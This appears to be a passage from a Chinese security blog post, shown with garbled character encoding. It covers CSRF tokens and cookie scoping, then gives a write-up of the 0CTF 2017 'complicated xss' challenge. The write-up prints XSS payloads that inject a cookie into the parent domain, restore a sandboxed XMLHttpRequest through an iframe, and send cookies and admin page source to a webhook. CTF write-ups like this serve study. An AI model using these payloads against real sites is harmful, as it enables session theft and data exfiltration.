&lt;p>å®ç°æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦ç»™æ¯ä¸€ä¸ªé¡µé¢éƒ½å†™å…¥Tokenï¼ˆå‰ç«¯æ— æ³•ä½¿ç”¨çº¯é™æ€é¡µé¢ï¼‰ï¼Œæ¯ä¸€ä¸ªFormåŠAjaxè¯·æ±‚éƒ½æºå¸¦è¿™ä¸ªTokenï¼Œåç«¯å¯¹æ¯ä¸€ä¸ªæ¥å£éƒ½è¿›è¡Œæ ¡éªŒï¼Œå¹¶ä¿è¯é¡µé¢TokenåŠè¯·æ±‚Tokenä¸€è‡´ï¼Œè¿™å°±ä½¿å¾—è¿™ä¸ªé˜²æŠ¤ç­–ç•¥ä¸èƒ½åœ¨é€šç”¨çš„æ‹¦æˆªä¸Šç»Ÿä¸€æ‹¦æˆªå¤„ç†ï¼Œè€Œéœ€è¦æ¯ä¸€ä¸ªé¡µé¢å’Œæ¥å£éƒ½æ·»åŠ å¯¹åº”çš„è¾“å‡ºå’Œæ ¡éªŒã€‚è¿™ç§æ–¹æ³•å·¥ä½œé‡å·¨å¤§ï¼Œä¸”æœ‰å¯èƒ½é—æ¼&lt;/p>
&lt;h1 id="cookieç›¸å…³å‰ç½®">cookieç›¸å…³å‰ç½®&lt;/h1>
&lt;p>&lt;a href="https://datatracker.ietf.org/doc/html/rfc6265#section-8.5">Weak Confidentiality&lt;/a>&lt;/p>
&lt;ul>
&lt;li>cookieä½¿ç”¨domainå’Œpathä½œä¸ºåŒæºé™åˆ¶ï¼Œä¸åŒºåˆ†ç«¯å£å’Œåè®®(http/https)ï¼›pathå‘ä¸‹é€šé…ï¼›domainæ˜¯å‘ä¸Šé€šé…çš„ï¼Œæ‰€ä»¥&lt;u>å­åŸŸåå¯ä»¥å†™cookieåˆ°çˆ¶åŸŸ&lt;/u>ï¼›&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>// a.b.com
cookie = &amp;#34;trash;domain=.b.com;&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>phpå¤„ç†åŒåcookieï¼Œå–å‰è€…&lt;/li>
&lt;li>Tornadoå¤„ç†åŒåcookieï¼Œåè€…è¦†ç›–å‰è€…ï¼›å¯åˆ©ç”¨è¿™ä¸€ç‚¹è¿›è¡ŒCSRF&lt;/li>
&lt;/ul>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.leavesongs.com/HTML/zhihu-xss-worm.html">çŸ¥ä¹æŸå¤„XSS+åˆ·ç²‰è¶…è¯¦ç»†æ¼æ´æŠ€æœ¯åˆ†æ&lt;/a>&lt;/p>
&lt;ul>
&lt;li>å¯ä»¥é€šè¿‡è®¾ç½®pathæ¥è°ƒæ•´ä¼˜å…ˆçº§&lt;/li>
&lt;/ul>
&lt;p>pathç›¸åŒé•¿åº¦ï¼Œåˆ›å»ºæ—¶é—´æ›´æ—©æ›´ä¼˜å…ˆï¼›pathæ›´é•¿æ›´ä¼˜å…ˆ&lt;/p>
&lt;pre tabindex="0">&lt;code>path = /admin
path = /admin/ ä¼˜å…ˆ
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>æ¯ä¸€ä¸ªcookieéƒ½æœ‰ä¸ä¹‹ç›¸å…³çš„åŸŸï¼Œè¿™ä¸ªåŸŸçš„èŒƒå›´ä¸€èˆ¬é€šè¿‡&lt;code>domain&lt;/code>å±æ€§æŒ‡å®š&lt;/li>
&lt;/ul>
&lt;p>å¦‚æœåŸŸä¸é¡µé¢çš„åŸŸç›¸åŒï¼Œç§°ä¸ºç¬¬ä¸€æ–¹cookieï¼Œä¸åŒåˆ™ç§°ä¸ºç¬¬ä¸‰æ–¹cookieï¼›ä¸€ä¸ªé¡µé¢åŒ…å«å›¾ç‰‡æˆ–å­˜æ”¾å…¶å®ƒåŸŸä¸Šçš„èµ„æºæ—¶ï¼Œç¬¬ä¸€æ–¹çš„cookieä¹Ÿåªä¼šå‘é€åˆ°è®¾ç½®å®ƒä»¬çš„æœåŠ¡å™¨&lt;/p>
&lt;h1 id="xss--csrf">XSS + CSRF&lt;/h1>
&lt;p>æ”»å‡»æµç¨‹&lt;/p>
&lt;ul>
&lt;li>é¦–å…ˆä¸€ä¸ªxssè§¦å‘ç‚¹&lt;/li>
&lt;li>payloadä¸­åŒ…å«iframeï¼Œåœ¨æ¡†æ¶å†…è®©å—å®³è€…è¿›è¡ŒCSRF&lt;/li>
&lt;/ul>
&lt;p>ä¸»è¦çœ‹ä¸‹é¢çš„ä¾‹é¢˜å°±å®Œäº‹äº†&lt;/p>
&lt;h1 id="in-ctf">in CTF&lt;/h1>
&lt;h2 id="0ctf-2017complicated-xss">[0CTF 2017]complicated xss&lt;/h2>
&lt;p>æœ‰ä¸¤ä¸ªç«™ &lt;code>http://admin.government.vip:8000&lt;/code>ï¼ˆæœ‰flagï¼‰å’Œ&lt;code>http://government.vip/&lt;/code>ï¼ˆä¸»ç«™ï¼‰&lt;/p>
&lt;p>ä¸»ç«™æœ‰xssç‚¹ï¼Œæ— é˜²æŠ¤ï¼Œæ˜¯åœ¨å½“å‰çš„ä¸»ç«™ç‚¹è§¦å‘xss&lt;/p>
&lt;p>adminçš„é‚£ä¸ªå­åŸŸçš„ç«™æœ‰ç™»å½•æ¡†ï¼Œé»˜è®¤test: testå¼±å£ä»¤å¯ä»¥ä½æƒé™ç™»å…¥ï¼Œç™»å…¥åå‘ç°cookieçš„usernameå­—æ®µæœ‰xssç‚¹ï¼ˆå†…å®¹è¾“å‡ºåˆ°é¡µé¢çš„&lt;code>&amp;lt;h1&amp;gt;&lt;/code>æ ‡ç­¾ä¸­ï¼‰ï¼Œä¸è¿‡é¡µé¢å­˜åœ¨æ²™ç®±&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//sandbox
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Function&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">alert&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">postMessage&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å·¥ä½œæ–¹å¼æ˜¯åˆ é™¤äº†å¾ˆå¤š&lt;code>window.&lt;/code>è¿™æ ·çš„å‡½æ•°&lt;/p>
&lt;p>adminå­åŸŸç«™è¿˜æœ‰uploadçš„åŠŸèƒ½ ä½†æ˜¯åªèƒ½adminè´¦æˆ·æ‰å¯ç™»å…¥ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—ä¸Šä¼ éƒ¨åˆ†çš„ä»£ç æ¥ç¡®å®šæˆ‘ä»¬çš„payloadæ„æˆï¼Œä½†æ˜¯ç”±äºwebçš„SOPåŒæºç­–ç•¥ï¼Œæ‰€ä»¥ä¸¤ä¸ªç«™è·¨åŸŸ è¯»ä¸åˆ°cookie&lt;/p>
&lt;p>è¿™é‡Œè¦å€ŸåŠ©cookieä¸­çš„SOPç­–ç•¥äº†ï¼Œä»…æ ¹æ®domain+pathæ¥åŒºåˆ†ï¼Œä¸ä¾æ®port+protocolï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å­åŸŸä¿®æ”¹çˆ¶åŸŸçš„cookieå€¼&lt;/p>
&lt;pre tabindex="0">&lt;code>cookie=&amp;#34;username=&amp;lt;XSS code&amp;gt;;domain=.government.vip;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè®¿é—®adminå­åŸŸç«™æ—¶å°±ä¼šæºå¸¦ä»¥ä¸‹ä¸¤æ¡cookie&lt;/p>
&lt;pre tabindex="0">&lt;code>username=&amp;#34;XSS; domain=.government.vip&amp;#34;
username=&amp;#34;test; domain=admin.government.vip; path=/&amp;#34;
&lt;/code>&lt;/pre>&lt;p>ç”±äºcookieçš„è¯»å–æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰€ä»¥ä¸Šé¢ä¸¤æ¡cookieåœ¨è¢«åç«¯è§£ææ—¶å®Œå…¨ç›¸åŒï¼Œé€‰å–å“ªæ¡cookieå®Œå…¨å–å†³äºåç«¯ä»£ç çš„å®ç°ï¼Œå“åº”å¤´æŒ‡å‡ºåç«¯æ¡†æ¶æ˜¯TornadoServer/4.4.2ï¼Œä¼šå¯¼è‡´åŒåcookieåè€…è¦†ç›–å‰è€…ï¼Œä½¿æˆ‘ä»¬çš„æ”»å‡»å®ç°&lt;/p>
&lt;p>ç»“åˆä¸Šé¢çš„ï¼Œæˆ‘ä»¬çš„å¤§è‡´æ€è·¯æ˜¯è¿™æ ·çš„ï¼š&lt;/p>
&lt;p>ä¸»ç«™xssæ¥è®¾ç½®adminå­åŸŸç«™çš„cookieå€¼ ç„¶åå†è·³è½¬åˆ°adminå­åŸŸç«™ å€Ÿç”±è¿™é‡Œcookieçš„xssè§¦å‘ç¬¬äºŒä¸ªxss&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;script src=//vps-ip/xss/test.js&amp;gt;&amp;lt;\/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;username=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;testxss;domain=.government.vip;path=\/;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://admin.government.vip:8000/&amp;#39;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>test.js è·å–cookie&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://webhook/?cookie=&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥æˆåŠŸè·å–æ•°æ®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Tue Mar &lt;span style="color:#ae81ff">21&lt;/span> 20:13:35 2017&lt;span style="color:#f92672">]&lt;/span> 202.120.7.205:47632 &lt;span style="color:#f92672">[&lt;/span>200&lt;span style="color:#f92672">]&lt;/span>: /xss/xss_new.php?cookie&lt;span style="color:#f92672">=&lt;/span>username%3Dadmin%3B%20username%3D%3Cscript%20src%3D//121.42.175.111%3A8080/xss/test.js%3E%3C/script%3Etestxss
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>adminçš„sessionidè®¾ç½®äº†HttpOnlyï¼Œæˆ‘ä»¬è¿˜å¾—CSRF&lt;/p>
&lt;p>ç”±äºadminå­åŸŸç«™åˆ é™¤äº†ä¸€äº›å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&lt;code>iframe&lt;/code>çš„éªšæ“ä½œæ¥ç»•è¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sandbox&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>window.XMLHttpRequest=document.getElementById(&amp;#39;sandbox&amp;#39;).contentWindow.XMLHttpRequest;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥æ„é€ ajaxæ¥è¯»adminçš„é¡µé¢æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">xss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;iframe id=\&amp;#34;sandbox\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=//vps-ip/xss/test.js&amp;gt;&amp;lt;\/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;username=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;testxss;domain=.government.vip;path=\/;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://admin.government.vip:8000/&amp;#39;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>test.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onreadystatechange&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readyState&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;img&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://webhook/?cookie=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥è·å¾—ç®¡ç†å‘˜é¡µé¢ä»£ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!doctype html&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>Admin Panel&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">title&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//sandbox
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Function&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">alert&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">postMessage&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">h1&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>Hello &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sandbox&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">iframe&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">//vps-ip/xss/test.js&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>testxss&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">h1&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>Upload your shell&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
